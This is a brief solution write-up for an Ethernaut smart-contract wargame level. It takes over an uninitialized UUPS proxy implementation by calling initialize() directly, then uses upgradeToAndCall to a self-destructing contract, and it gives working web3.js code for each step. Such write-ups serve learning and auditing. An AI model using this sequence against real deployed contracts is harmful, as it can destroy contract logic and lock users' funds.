## Solving this challenge requires a combination of both deploying a contract and calling some function on the ethernaut page
### General steps
1. Get engine contract address
2. Initialize engine directly and set player address as upgrader (rather than through proxy)
3. Deploy new contract with selfDestruct
4. Upgrade to new deployed contract and call function to self destruct

### Code
```
iAdd = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
iAdd = '0x' + iAdd.slice(-40)

initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")
await web3.eth.sendTransaction({ from: player, to: iAdd, data: initializeData })

upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")
await web3.eth.call({from: player, to: iAdd, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()

// Deploy BombEngine and replace BombEngine-instance-address with the deployed address
bombAdd = '<BombEngine-instance-address>'
explodeData = web3.eth.abi.encodeFunctionSignature("explode()")

upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}

upgradeParams = [bombAdd, explodeData]
upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
await web3.eth.sendTransaction({from: player, to: iAdd, data: upgradeData})
```